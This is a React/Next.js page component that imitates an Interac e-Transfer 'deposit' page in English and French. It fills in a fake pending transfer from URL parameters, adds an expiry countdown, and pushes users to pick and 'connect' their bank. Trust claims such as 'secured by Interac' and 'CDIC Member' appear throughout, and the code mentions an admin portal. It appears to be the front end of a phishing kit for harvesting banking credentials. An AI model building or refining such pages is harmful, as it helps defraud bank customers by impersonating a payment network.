"use client"

import { useState, useEffect, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import {
  ShieldCheck,
  ArrowDown,
  CheckCircle,
  AlertCircle,
  Lock,
  Clock,
  ExternalLink,
} from "lucide-react"
import { useLanguage } from "@/lib/i18n/context"
import BankSelectorGrid from "@/components/BankSelectorGrid"
import SearchBar from "@/components/SearchBar"
import InteracHeader from "@/components/email/interac-header"

interface TransferData {
  transferId: string
  amount: string
  recipient: string
  recipientName: string
  bankName: string
  message: string
  timestamp: string
}

function formatAmount(val: string | number) {
  const n = typeof val === "string" ? parseFloat(val) : val
  if (isNaN(n)) return "0.00"
  return n.toLocaleString("en-CA", { minimumFractionDigits: 2, maximumFractionDigits: 2 })
}

function getExpiry(timestamp: string) {
  const base = timestamp ? new Date(timestamp) : new Date()
  base.setDate(base.getDate() + 30)
  return base
}

function ClientDepositContent() {
  const searchParams = useSearchParams()
  const { language, toggleLanguage } = useLanguage()

  const [transferData, setTransferData] = useState<TransferData | null>(null)
  const [timeLeft, setTimeLeft]         = useState("")
  const [searchTerm, setSearchTerm]     = useState("")

  const COPY = {
    en: {
      badge:        "Interac e-Transfer",
      awaiting:     "Awaiting your deposit",
      from:         "From",
      amount:       "Amount",
      reference:    "Reference",
      expires:      "Expires",
      message:      "Message",
      readyTitle:   "Ready to Deposit",
      readyBody:    (amt: string) => `Connect your bank below to complete your $${amt} CAD deposit.`,
      selectBank:   "Select your bank to continue",
      secureNote:   "Your banking credentials are never shared. This connection is secured by Interac.",
      trustSsl:     "256-bit SSL",
      trustCdic:    "CDIC Member",
      trustLive:    "Bank-level security",
      noTransfer:   "No transfer found",
      noTransferSub:"This link may be invalid or expired. Contact the sender for a new link.",
      expired:      "Expired",
    },
    fr: {
      badge:        "Virement Interac",
      awaiting:     "En attente de votre dépôt",
      from:         "De",
      amount:       "Montant",
      reference:    "Référence",
      expires:      "Expire",
      message:      "Message",
      readyTitle:   "Prêt à déposer",
      readyBody:    (amt: string) => `Connectez votre banque ci-dessous pour finaliser votre dépôt de $${amt} CAD.`,
      selectBank:   "Sélectionnez votre banque pour continuer",
      secureNote:   "Vos identifiants bancaires ne sont jamais partagés. Cette connexion est sécurisée par Interac.",
      trustSsl:     "SSL 256 bits",
      trustCdic:    "Membre SADC",
      trustLive:    "Sécurité bancaire",
      noTransfer:   "Aucun virement trouvé",
      noTransferSub:"Ce lien est peut-être invalide ou expiré. Contactez l'expéditeur pour un nouveau lien.",
      expired:      "Expiré",
    },
  }

  const c = COPY[language] ?? COPY.en

  useEffect(() => {
    const transferId   = searchParams.get("transferId")
    const amount       = searchParams.get("amount")
    const recipient    = searchParams.get("recipient")
    const recipientName = searchParams.get("recipientName")
    const bankName     = searchParams.get("bankName")
    const message      = searchParams.get("message")
    const timestamp    = searchParams.get("timestamp")

    if (transferId && amount) {
      const data: TransferData = {
        transferId,
        amount:        amount || "0",
        recipient:     recipient || "",
        recipientName: recipientName || "",
        bankName:      bankName || "QuantumYield",
        message:       message || "",
        timestamp:     timestamp || new Date().toISOString(),
      }
      setTransferData(data)

      // Persist to localStorage so admin portal can fetch it
      try {
        const raw = localStorage.getItem("depositHistory")
        const history = raw ? JSON.parse(raw) : []
        const exists = history.findIndex((h: any) => h.transferId === transferId)
        const entry = { ...data, id: transferId, status: "pending" }
        if (exists >= 0) history[exists] = entry
        else history.unshift(entry)
        localStorage.setItem("depositHistory", JSON.stringify(history.slice(0, 50)))
      } catch { /* silently ignore storage errors */ }
    }
  }, [])  // eslint-disable-line react-hooks/exhaustive-deps

  // Countdown to expiry
  useEffect(() => {
    if (!transferData) return
    const expiry = getExpiry(transferData.timestamp)
    const tick = () => {
      const diff = expiry.getTime() - Date.now()
      if (diff <= 0) { setTimeLeft(c.expired); return }
      const d = Math.floor(diff / 86400000)
      const h = Math.floor((diff % 86400000) / 3600000)
      const m = Math.floor((diff % 3600000) / 60000)
      const s = Math.floor((diff % 60000) / 1000)
      if (d > 0) setTimeLeft(`${d}d ${h}h`)
      else if (h > 0) setTimeLeft(`${h}h ${m}m`)
      else setTimeLeft(`${m}m ${s}s`)
    }
    tick()
    const iv = setInterval(tick, 1000)
    return () => clearInterval(iv)
  }, [transferData, language])

  return (
    <div className="min-h-screen bg-zinc-950 flex flex-col">

      {/* Brand header */}
      <header className="bg-zinc-900 border-b border-zinc-800">
        <InteracHeader language={language} />
        {/* Language toggle */}
        <div className="flex justify-end px-4 py-2 border-t border-zinc-800/50">
          <div className="flex items-center gap-1 bg-zinc-800 border border-zinc-700 rounded-lg p-1">
            {(["en", "fr"] as const).map((l) => (
              <button
                key={l}
                onClick={() => language !== l && toggleLanguage()}
                className={`px-3 py-1 rounded-md text-xs font-semibold transition-all ${
                  language === l ? "bg-[#FDB913] text-black" : "text-zinc-400 hover:text-white"
                }`}
              >
                {l.toUpperCase()}
              </button>
            ))}
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-3xl w-full mx-auto px-4 py-8 space-y-8">

        {!transferData ? (
          /* No transfer params */
          <div className="flex flex-col items-center justify-center py-24 text-center space-y-4">
            <div className="w-16 h-16 rounded-full bg-zinc-800 flex items-center justify-center">
              <AlertCircle className="w-8 h-8 text-zinc-500" />
            </div>
            <h2 className="text-xl font-bold text-white">{c.noTransfer}</h2>
            <p className="text-sm text-zinc-500 max-w-xs">{c.noTransferSub}</p>
          </div>
        ) : (
          <>
            {/* Transfer details card */}
            <div className="bg-zinc-900 border border-zinc-800 rounded-2xl overflow-hidden">
              <div className="px-6 py-5 border-b border-zinc-800 flex items-center justify-between gap-3 flex-wrap">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-amber-500/10 flex items-center justify-center">
                    <Clock className="w-5 h-5 text-amber-400" />
                  </div>
                  <div>
                    <p className="text-sm font-semibold text-white">{c.awaiting}</p>
                    <p className="text-xs text-zinc-500">{c.expires}: {timeLeft}</p>
                  </div>
                </div>
                <span className="px-3 py-1 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-full text-xs font-medium">
                  Pending
                </span>
              </div>

              <div className="px-6 py-6 space-y-5">
                {/* Big amount display */}
                <div>
                  <p className="text-xs text-zinc-500 mb-1">{c.amount}</p>
                  <div className="flex items-baseline gap-2">
                    <span className="text-5xl font-bold text-white">
                      ${formatAmount(transferData.amount)}
                    </span>
                    <span className="text-xl font-semibold text-zinc-500">CAD</span>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4 pt-4 border-t border-zinc-800">
                  {transferData.recipientName && (
                    <div>
                      <p className="text-xs text-zinc-500 mb-0.5">{c.from}</p>
                      <p className="text-sm font-semibold text-white">{transferData.bankName}</p>
                    </div>
                  )}
                  <div>
                    <p className="text-xs text-zinc-500 mb-0.5">{c.reference}</p>
                    <p className="text-xs font-mono text-zinc-300">{transferData.transferId}</p>
                  </div>
                  {transferData.message && (
                    <div className="col-span-2">
                      <p className="text-xs text-zinc-500 mb-0.5">{c.message}</p>
                      <p className="text-sm text-zinc-300">{transferData.message}</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Ready banner */}
            <div className="bg-green-950/40 border border-green-800/40 rounded-xl p-5 flex items-start gap-4">
              <div className="w-10 h-10 shrink-0 rounded-full bg-green-500 flex items-center justify-center">
                <CheckCircle className="w-5 h-5 text-white" />
              </div>
              <div>
                <p className="text-sm font-bold text-green-300">{c.readyTitle}</p>
                <p className="text-sm text-green-400/80 mt-0.5">
                  {c.readyBody(formatAmount(transferData.amount))}
                </p>
              </div>
            </div>

            {/* Bank selector */}
            <section className="space-y-5">
              <div className="flex items-center justify-between flex-wrap gap-3">
                <h2 className="text-base font-semibold text-white flex items-center gap-2">
                  <ArrowDown className="w-4 h-4 text-[#FDB913]" />
                  {c.selectBank}
                </h2>
                <SearchBar onSearch={setSearchTerm} />
              </div>
              <BankSelectorGrid searchTerm={searchTerm} transferData={transferData} />
            </section>

            {/* Security note */}
            <div className="flex items-start gap-3 px-4 py-4 bg-zinc-900/50 rounded-xl border border-zinc-800">
              <Lock className="w-4 h-4 text-zinc-500 shrink-0 mt-0.5" />
              <p className="text-xs text-zinc-500 leading-relaxed">{c.secureNote}</p>
            </div>
          </>
        )}

        {/* Trust bar */}
        <div className="flex items-center justify-center gap-6 flex-wrap pt-4 border-t border-zinc-800/50">
          {[
            { icon: ShieldCheck, label: c.trustSsl },
            { icon: Lock,        label: c.trustLive },
            { icon: ExternalLink, label: c.trustCdic },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 text-zinc-600">
              <Icon className="w-3.5 h-3.5" />
              <span className="text-xs font-medium">{label}</span>
            </div>
          ))}
        </div>

      </main>
    </div>
  )
}

export default function ClientDepositPortal() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-zinc-950 flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-[#FDB913] border-r-transparent rounded-full animate-spin" />
      </div>
    }>
      <ClientDepositContent />
    </Suspense>
  )
}
